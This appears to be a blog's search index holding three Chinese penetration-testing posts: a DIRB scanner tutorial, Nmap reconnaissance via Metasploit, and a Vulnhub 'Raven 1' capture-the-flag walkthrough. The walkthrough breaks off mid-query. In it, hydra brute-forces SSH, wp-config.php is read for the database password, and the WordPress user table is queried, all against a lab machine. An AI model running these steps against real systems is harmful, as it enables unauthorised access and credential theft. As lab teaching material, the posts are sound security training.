<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DIRB]]></title>
    <url>%2FTOOLS%2FWEB%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%2FDIRB.html</url>
    <content type="text"><![CDATA[简介DIRB是一个Web内容扫描程序。它查找现有（和/或隐藏）Web对象。它基本上是通过对Web服务器启动基于字典的攻击并分析响应来实现的。 DIRB附带了一组预先配置的攻击单词列表，方便使用，但您可以使用自定义单词列表。DIRB有时也可以用作经典的CGI扫描仪，但记住的是内容扫描程序而不是漏洞扫描程序。 DIRB的主要目的是帮助进行专业的Web应用程序审计。特别是在安全相关的测试中。它涵盖了经典Web漏洞扫描程序未涵盖的一些漏洞。DIRB查找其他通用CGI扫描仪无法查找的特定Web对象。它不会搜索漏洞，也不会查找可能存在漏洞的Web内容。 参数12345678910111213141516171819202122232425262728293031323334353637383940414243444546root@kali:~# dirb-----------------DIRB v2.22By The Dark Raver-----------------dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]========================= NOTES ========================= &lt;url_base&gt; : Base URL to scan. (Use -resume for session resuming) &lt;wordlist_file(s)&gt; : List of wordfiles. (wordfile1,wordfile2,wordfile3...)======================== HOTKEYS ======================== &apos;n&apos; -&gt; Go to next directory. &apos;q&apos; -&gt; Stop scan. (Saving state for resume) &apos;r&apos; -&gt; Remaining scan stats.======================== OPTIONS ======================== -a &lt;agent_string&gt; : Specify your custom USER_AGENT. -b : Use path as is. -c &lt;cookie_string&gt; : Set a cookie for the HTTP request. -E &lt;certificate&gt; : path to the client certificate. -f : Fine tunning of NOT_FOUND (404) detection. -H &lt;header_string&gt; : Add a custom header to the HTTP request. -i : Use case-insensitive search. -l : Print &quot;Location&quot; header when found. -N &lt;nf_code&gt;: Ignore responses with this HTTP code. -o &lt;output_file&gt; : Save output to disk. -p &lt;proxy[:port]&gt; : Use this proxy. (Default port is 1080) -P &lt;proxy_username:proxy_password&gt; : Proxy Authentication. -r : Don&apos;t search recursively. -R : Interactive recursion. (Asks for each directory) -S : Silent Mode. Don&apos;t show tested words. (For dumb terminals) -t : Don&apos;t force an ending &apos;/&apos; on URLs. -u &lt;username:password&gt; : HTTP Authentication. -v : Show also NOT_FOUND pages. -w : Don&apos;t stop on WARNING messages. -X &lt;extensions&gt; / -x &lt;exts_file&gt; : Append each word with this extensions. -z &lt;millisecs&gt; : Add a milliseconds delay to not cause excessive Flood.======================== EXAMPLES ======================= dirb http://url/directory/ (Simple Test) dirb http://url/ -X .html (Test files with &apos;.html&apos; extension) dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist) dirb https://secure_url/ (Simple Test with SSL) dirb用法示例攻击中，common.txt被设置为目录遍历的默认单词列表使用字典文件（/usr/share/wordlists/dirb/common.txt）扫描Web服务器（http://192.168.126.130/）以获取目录：dirb 目标 字典路径1234567891011121314root@kali:/# dirb http://192.168.126.130 /usr/share/wordlists/dirb/common.txt-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 16:33:46 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt-----------------GENERATED WORDS: 4612 枚举具有特定扩展名列表的目录在很多情况下我们需要在目标服务器上提取特定扩展的目录，然后我们可以使用dirb扫描的-X参数。此参数接受文件扩展名，然后在目标服务器或计算机上搜索给定的扩展文件。dirb 目标 -X .php上面的命令将提取与php扩展相关的所有目录路径，如下图所示123456789101112131415161718192021root@kali:/# dirb http://192.168.126.130 -X .php-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 17:12:16 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtEXTENSIONS_LIST: (.php) | (.php) [NUM = 1]-----------------GENERATED WORDS: 4612---- Scanning URL: http://192.168.126.130/ ---------------------END_TIME: Fri Feb 22 17:12:24 2019DOWNLOADED: 4612 - FOUND: 0 将输出保存到磁盘出于记录维护，更好的可读性和未来参考的目的，我们将dirb扫描的输出保存到文件中。为此，我们将使用dirb扫描的参数-o，我们可以在文本文件中保存dirb扫描的输出。dirb 目标 -o /位置/自定义名称.txt上面的命令将在枚举目录的桌面上生成.txt文件。123456789101112131415root@kali:/# dirb http://192.168.126.130 -o /root/123.txt-----------------DIRB v2.22By The Dark Raver-----------------OUTPUT_FILE: /root/123.txtSTART_TIME: Fri Feb 22 17:15:22 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 root@kali:~# cat /root/123.txt现在我们已经成功执行了命令，现在让我们遍历该位置以确保输出是否已保存在文件上。在这种情况下，我们的输出位置是/root/123.txt。 忽略不必要的状态代码Status-Code元素是一个3位整数，其中Status-Code的第一个数字定义了响应类，后两个数字没有任何分类角色。在这次攻击中，我们在代码302上使用-N参数，如下所示。dirb 目标 -N 302您可以从给定的屏幕截图中了解到dirb扫描忽略的是NOT FOUND代码，即302。123456root@kali:~# dirb http://192.168.126.130 -N 302-----------------DIRB v2.22By The Dark Raver----------------- 默认工作与警告消息不间断工作正常dirb扫描期间，一些页面会生成警告; dirb扫描会跳过遇到任何警告的目录。在进行非常深入和冗长的扫描时，我们希望dirb扫描不要避免这些警告并进行深入扫描，因此我们使用dirb扫描的-w参数。dirb 目标 -w您可以观察到突出显示的目录/ dev / shell即使在默认扫描中缺少警告消息之后也会被枚举123456root@kali:~# dirb http://192.168.126.130 -w-----------------DIRB v2.22By The Dark Raver----------------- 速度延迟在不同场景下工作时，我们遇到的某些环境无法处理由dirb扫描创建的洪水，因此在这些环境中，我们将扫描延迟一段时间非常重要。使用dirb扫描的-z参数可以轻松完成此操作。在此参数中，时间以毫秒为单位提供。就像我们给出的例子中所示，我们给dirb延迟了100秒。dirb 目标 -z 1001234567891011root@kali:~# dirb http://192.168.126.130 -z 100-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:11:47 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtSPEED_DELAY: 100 milliseconds 不递归（-r）默认情况下，dirb扫描以递归方式扫描目录。这意味着它扫描目录，然后遍历该目录以扫描更多子目录。但在某些情况下，如果时间不够，我们会将dirb设置为不递归扫描。这可以使用-r参数来实现。1234567891011root@kali:~# dirb http://192.168.126.130 -r-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:13:13 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtOPTION: Not Recursive 显示不存在页面404错误是HTTP状态代码，表示您尝试在网站上访问的页面无法在其服务器上找到。404 Not Found错误消息经常由各个网站自定义。在某些情况下，我们也需要找到404页面，默认情况下dirb会跳过。要查找这些页面，我们将使用-v参数。dirb 目标 -v从下面中你可以观察到它还提取了所有那些与404错误相关的目录。1234567891011root@kali:~# dirb http://192.168.126.130 -v-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:14:17 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtOPTION: Show Not Existent Pages 扩展名列表（-X参数）与扩展名标头（-H参数）通过将-X参数与具有特定扩展名的目标URL（例如.php）一起使用，它枚举所有扩展名为.php的文件或目录，但使用带有特定扩展名的-H参数，例如.php以及目标URL它将枚举用php命名的所有文件或目录，如下面给出的图像所示。dirb 目标 -H .PHP1234567891011121314root@kali:~# dirb http://192.168.126.130 -H .php-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:16:36 2019URL_BASE: http://192.168.126.130/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtADDED_HEADERS:--.php-- HTTP AUTHORIZATION（-u用户名：密码）HTTP身份验证/身份验证机制都基于使用401状态代码和WWW- Authenticate 响应头。最广泛使用的 HTTP身份验证 机制是 Basic。客户端将用户名和密码作为未加密的base64编码文本发送。 因此，为了在dirb的帮助下绕过这种身份验证，我们使用了以下命令：dirb 目标 -u test:test结果，它显示了测试的状态码200：目标URL上的测试和授权凭证。1234567891011root@kali:~# dirb http://192.168.126.130/admin/admin.asp -u test:test-----------------DIRB v2.22By The Dark Raver-----------------START_TIME: Fri Feb 22 18:22:47 2019URL_BASE: http://192.168.126.130/admin/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtAUTHORIZATION: test:test 代理URL使用-p选项可以将代理URL用于所有请求，默认情况下它适用于端口1080.正如您所看到的，在Web浏览器中探索目标网络IP时，它会显示“访问禁止错误”，这意味着此网页是在一些代理后面运行。 测试特殊弱势列表我们可以使用DIRB来测试特定类型的Web技术中的特定易受攻击对象。每种Web技术都有不同的漏洞。他们并非都是一样的。DIRB可以帮助我们查找特定技术特定的特定易受攻击对象。 在Kali，DIRB有特定的单词列表来搜索这些易受攻击的经常隐藏的对象。您可以在以下位置找到它们12345678root@kali:/# cd /usr/share/dirb/wordlists/vulns/root@kali:/usr/share/dirb/wordlists/vulns# lsapache.txt fatwire.txt jboss.txt sap.txt weblogic.txtaxis.txt frontpage.txt jersey.txt sharepoint.txt websphere.txtcgis.txt hpsmh.txt jrun.txt sunas.txtcoldfusion.txt hyperion.txt netware.txt tests.txtdomino.txt iis.txt oracle.txt tomcat.txtfatwire_pagenames.txt iplanet.txt ror.txt vignette.txt 正如您在上面所看到的，每个要测试的特定漏洞都有许多文件列表。如果您的Web服务器是Apache，并且您想测试它，请使用apache.txt 现在，DIRB将使用该Apache列表来查找已知的易受攻击对象。如果它找到任何，那么您可以采取下一步并寻找漏洞，以利用它在Exploit-DB，Metasploit，SecurityFocus或Web上的任何其他许多漏洞利用源。当然，您必须使用与网站中使用的技术相适应的词汇表。例如，如果它是Windows IIS服务器，则应使用iis.txt wordlist。]]></content>
      <categories>
        <category>TOOLS</category>
        <category>WEB应用程序</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>TOOLS</tag>
        <tag>工具</tag>
        <tag>渗透测试</tag>
        <tag>目录扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit's 信息搜集]]></title>
    <url>%2FWEB%E5%AE%89%E5%85%A8%2Fmetasploit%2FMetasploit-s-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
    <content type="text"><![CDATA[使用Nmap进行端口扫描在被动信息搜集确定了目标的IP范围之后，我们可以开始使用端口扫描获取目标开放的端口，端口的扫描过程实际上是逐个对远程主机的端口发起连接，从而确定那些端口是开放的过程。 Nmap是最流行的端口扫描工具，它与Metasploit的集成可谓是珠联璧合，在Metasoloit中，Nmap的输出结果可以保存在后端数据库中以备后续使用。Nmap能够让你一次性扫描大量主机并确定每台主机上运行的服务，其中每哥服务都可能是一个进入系统的入口。 使用之前我们就可以看看nmap的基本语法，有很多的参数和选项。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115root@kali:~# nmap -hNmap 7.70 ( https://nmap.org )Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL &lt;inputfilename&gt;: Input from list of hosts/networks -iR &lt;num hosts&gt;: Choose random targets --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks --excludefile &lt;exclude_file&gt;: Exclude list from fileHOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers --system-dns: Use OS&apos;s DNS resolver --traceroute: Trace hop path to each hostSCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags &lt;flags&gt;: Customize TCP scan flags -sI &lt;zombie host[:probeport]&gt;: Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b &lt;FTP relay host&gt;: FTP bounce scanPORT SPECIFICATION AND SCAN ORDER: -p &lt;port ranges&gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don&apos;t randomize --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging)SCRIPT SCAN: -sC: equivalent to --script=default --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts --script-args-file=filename: provide NSE script args in a file --script-trace: Show all data sent and received --script-updatedb: Update the script database. --script-help=&lt;Lua scripts&gt;: Show help about scripts. &lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories.OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressivelyTIMING AND PERFORMANCE: Options which take &lt;time&gt; are in seconds, or append &apos;ms&apos; (milliseconds), &apos;s&apos; (seconds), &apos;m&apos; (minutes), or &apos;h&apos; (hours) to the value (e.g. 30m). -T&lt;0-5&gt;: Set timing template (higher is faster) --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies probe round trip time. --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions. --host-timeout &lt;time&gt;: Give up on target after this long --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per secondFIREWALL/IDS EVASION AND SPOOFING: -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU) -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys -S &lt;IP_Address&gt;: Spoof source address -e &lt;iface&gt;: Use specified interface -g/--source-port &lt;portnum&gt;: Use given port number --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies --data &lt;hex string&gt;: Append a custom payload to sent packets --data-string &lt;string&gt;: Append a custom ASCII string to sent packets --data-length &lt;num&gt;: Append random data to sent packets --ip-options &lt;options&gt;: Send packets with specified ip options --ttl &lt;val&gt;: Set IP time-to-live field --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksumOUTPUT: -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename. -oA &lt;basename&gt;: Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --append-output: Append to rather than clobber specified output files --resume &lt;filename&gt;: Resume an aborted scan --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML outputMISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir &lt;dirname&gt;: Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page.EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES NMap选项之一-sS:-表示使用TCP SYN方式扫描TCP端口,执行一次隐秘的TCP扫描，已确定某个特定的TCP端口是否开放。-Pn：将所有主机视为在线——跳过主机发现。他告诉Nmap不要使用ping命令预先判断主机是否存活，而是默认所有主机都是存活状态。这个选项适用于Internet上的渗透测试，因为在lnternet上大多数网络均不允许ping命令所使用的“lnternet控制报文协议（ICMP）”通行，如果预先使用ping进行判断，那么你可能会漏掉许多实际存活的主机。如果在内网的环境中，可以省略这个选项。 使用-sS和-Pn选项对我们的靶机进行一次简单的nmap扫描 12345678910111213141516root@kali:~# nmap -sS -Pn 192.168.126.142Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-19 10:04 CSTNmap scan report for 192.168.126.142Host is up (0.00064s latency).Not shown: 993 filtered portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds554/tcp open rtsp2869/tcp open icslap5357/tcp open wsdapi10243/tcp open unknownMAC Address: 00:0C:29:62:C2:25 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds 可以看到nmap报告一个开放端口的列表。并且在每个端口后面附上其绑定服务的描述。为了获取更多的信息，我们可以尝试使用-A选项：启用脚本版本的检测，检测，扫描和方法，它将尝试进行深入的服务枚举和旗标获取，可以为我们提供目系统更多的细节。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354root@kali:~# nmap -sS -Pn -A 192.168.126.142Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-19 10:04 CSTNmap scan report for 192.168.126.142Host is up (0.0013s latency).Not shown: 993 filtered portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)554/tcp open rtsp?2869/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Service Unavailable10243/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundMAC Address: 00:0C:29:62:C2:25 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purpose|specialized|phoneRunning: Microsoft Windows 2008|8.1|7|Phone|VistaOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1OS details: Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008Network Distance: 1 hopService Info: Host: WIN7-PC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s|_nbstat: NetBIOS name: WIN7-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:62:c2:25 (VMware)| smb-os-discovery:| OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1| Computer name: win7-PC| NetBIOS computer name: WIN7-PC\x00| Workgroup: WORKGROUP\x00|_ System time: 2019-02-19T10:06:53+08:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2019-02-19 10:06:53|_ start_date: 2019-02-19 10:03:01TRACEROUTEHOP RTT ADDRESS1 1.32 ms 192.168.126.142OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 198.59 seconds]]></content>
      <categories>
        <category>WEB安全</category>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>工具</tag>
        <tag>渗透测试</tag>
        <tag>metasploit</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raven 1]]></title>
    <url>%2FVulnhub%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%BB%83%2FRaven-1.html</url>
    <content type="text"><![CDATA[介绍Raven 1被列为Vulnhub上的初级/中级CTF框。我会把它分类为初学者，但它总是取决于攻击者的技能组合。我建议在VMWare中运行它。有两种获取root的方法，我们将在本文中演示这两种方法 渗透开始识别IP地址使用netdiscover发现网络上的活动设备并获取受害计算机的IP地址root@kali:~# netdiscover -i eth0 -r 192.168.126.0/2412345678910Currently scanning: Finished! | Screen View: Unique Hosts4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240_____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname-----------------------------------------------------------------------------192.168.126.1 00:50:56:c0:00:08 1 60 VMware, Inc.192.168.126.2 00:50:56:f2:a4:d5 1 60 VMware, Inc.192.168.126.163 00:0c:29:b5:0d:93 1 60 VMware, Inc.192.168.126.254 00:50:56:e9:25:09 1 60 VMware, Inc. 目标机IP地址为：192.168.126.163 端口扫描枚举通常从确定目标上正在运行的端口开始。开放端口与目标上运行的服务相关联，如果它们恰好配置不当或过时，则可以利用它并以某种方式利用它们。最受欢迎的端口扫描工具是nmap12345678910111213141516171819202122232425262728293031323334353637root@kali:~# nmap -sV -A -p- 192.168.126.163Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-07 15:47 CSTNmap scan report for 192.168.126.163Host is up (0.00036s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey:| 1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)| 2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)| 256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)|_ 256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Raven Security111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 56210/tcp status|_ 100024 1 59633/udp status56210/tcp open status 1 (RPC #100024)MAC Address: 00:0C:29:B5:0D:93 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.36 ms 192.168.126.163OS and Service detection performed. Please report any incorrect results at https://nmap.o rg/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.86 seconds nmap至少发现了四个开放端口。在这四个中，端口22（SSH）和80（HTTP）是开始的好地方。SSH，因为如果我们可以找到登录凭据，我们可以在服务器上获得一个shell。HTTP，因为我们经常可以发现有关服务器上运行的内容的其他信息，这些信息可以帮助我们获取shell。枚举是关键，Web服务器是发现“隐藏”文件或目录，组织中的用户，可能易受攻击的Web应用程序等信息的良好来源。 浏览网站转移到80端口并发现了Raven Security的网站并且在http://192.168.126.163/service.html中获取到第一个flagflag1{b9bbcb33e11b80be759c4e844862482d} 扫描目录当我看到Web服务器正在运行时，我通常会启动nikto。Nikto将在网络服务器上进行一些探索，并寻找可能对我们感兴趣的新鲜事物。12345678910111213141516171819202122232425262728root@kali:~# nikto -h 192.168.126.163- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.126.163+ Target Hostname: 192.168.126.163+ Target Port: 80+ Start Time: 2019-02-18 16:30:25 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ Server leaks inodes via ETags, header found with file /, fields: 0x41b3 0x5734482bdcb00+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS+ OSVDB-3268: /img/: Directory indexing found.+ OSVDB-3092: /img/: This might be interesting...+ OSVDB-3092: /manual/: Web server manual found.+ OSVDB-3268: /manual/images/: Directory indexing found.+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.+ OSVDB-3233: /icons/README: Apache default file found.+ Uncommon header &apos;link&apos; found, with contents: &lt;http://raven.local/wordpress/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;+ /wordpress/: A Wordpress installation was found.+ 7535 requests: 0 error(s) and 14 item(s) reported on remote host+ End Time: 2019-02-18 16:30:56 (GMT8) (31 seconds)---------------------------------------------------------------------------+ 1 host(s) tested Nikto报告了一些我们可以研究的事情。像目录/img和/manual常见的Apache安装，因此这些成为我调查一个较低的优先级。然而，/wordpress指示Wordpress安装的目录很有趣。Wordpress插件往往过时，可能容易受到各种各样的攻击。最重要的是，Wordpress在其登录界面中具有此行为，允许我们枚举现有的用户帐户。 扫描WordPress由于这是WordPress，让我们运行一个wpscan，看看我们是否可以枚举一些用户。它通过检查Wordpress的版本及其插件的任何漏洞，以及尝试枚举和暴露它发现的用户帐户来执行各种操作。wpscan --url http://192.168.126.163/wordpress/ -eu获取到Michael和steven两个用户接下来进行用户密码破解 暴力破解hydra将对枚举用户进行强力尝试12345678910root@kali:~# hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.126.163Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-02-19 15:16:16[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task[DATA] attacking ssh://192.168.126.163:22/[22][ssh] host: 192.168.126.163 login: michael password: michael1 of 1 target successfully completed, 2 valid passwords foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-02-19 15:16:34 在一直试图暴力破解Wordpress之后，事实证明michaelSSH上的密码是michael。 SSH登陆123456789101112root@kali:~# ssh michael@192.168.126.163michael@192.168.126.163&apos;s password:The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.You have new mail.Last login: Tue Feb 19 11:36:04 2019 from 192.168.126.162michael@Raven:~$ 登陆到目标机123456michael@Raven:~$ cd /var/www/michael@Raven:/var/www$ lsflag2.txt htmlmichael@Raven:/var/www$ cat flag2.txtflag2&#123;fc3fd58dcdad9ab23faca6e9a36e581c&#125;michael@Raven:/var/www$ 获取到第二个flag 查看用户是否有无sudo权限，这通常意味着用户可以以root用户身份运行某些命令123michael@Raven:/$ sudo -l[sudo] password for michael:Sorry, user michael may not run sudo on raven. 发现MySQL我们将当前目录更改为/ var / www / html / wordpress并搜索wp-config文件，因为它将具有MySQL数据库的密码。123456789101112michael@Raven:/var/www/html$ lsabout.html css img scss team.htmlcontact.php elements.html index.html Security - Doc vendorcontact.zip fonts js service.html wordpressmichael@Raven:/var/www/html$ cd wordpress/michael@Raven:/var/www/html/wordpress$ lsindex.php wp-blog-header.php wp-cron.php wp-mail.phplicense.txt wp-comments-post.php wp-includes wp-settings.phpreadme.html wp-config.php wp-links-opml.php wp-signup.phpwp-activate.php wp-config-sample.php wp-load.php wp-trackback.phpwp-admin wp-content wp-login.php xmlrpc.phpmichael@Raven:/var/www/html/wordpress$ cat wp-config.php 查看文件内容1234567define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);/** MySQL database username */define(&apos;DB_USER&apos;, &apos;root&apos;);/** MySQL database password */define(&apos;DB_PASSWORD&apos;, &apos;R@v3nSecurity&apos;); 登陆mysql123456michael@Raven:/var/www/html/wordpress$ mysql -u root -pEnter password:mysql&gt; show databases;mysql&gt; use wordpress;mysql&gt; show tables;mysql&gt; select * from wp_users; 12345678mysql&gt; select * from wp_users;+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name 